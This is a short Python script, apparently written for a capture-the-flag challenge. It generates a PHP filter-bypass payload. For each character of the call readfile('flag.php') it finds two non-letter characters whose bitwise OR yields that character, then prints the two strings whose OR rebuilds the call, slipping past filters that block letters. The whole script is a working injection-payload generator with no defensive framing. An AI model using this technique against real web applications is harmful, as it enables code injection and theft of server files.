#!/usr/bin/env python
from rich import print
import string

pay = "readfile('flag.php');"
w = {c:[] for c in pay}
cand = '0123456789!#$%&()*+,-./:;<=>?@[]^_`{|}~"\''
for c in cand:
    if c not in string.ascii_letters:
        for d in cand:
            if d not in string.ascii_letters:
                f = chr(ord(c)|ord(d))
                if f in w and not w[f]:
                    w[f].append((c, d))

print(w)
one = []
two = []
for c in pay:
    one.append(w[c][0][0])
    two.append(w[c][0][1])
print(f'"{"".join(one)}"|"{"".join(two)}"')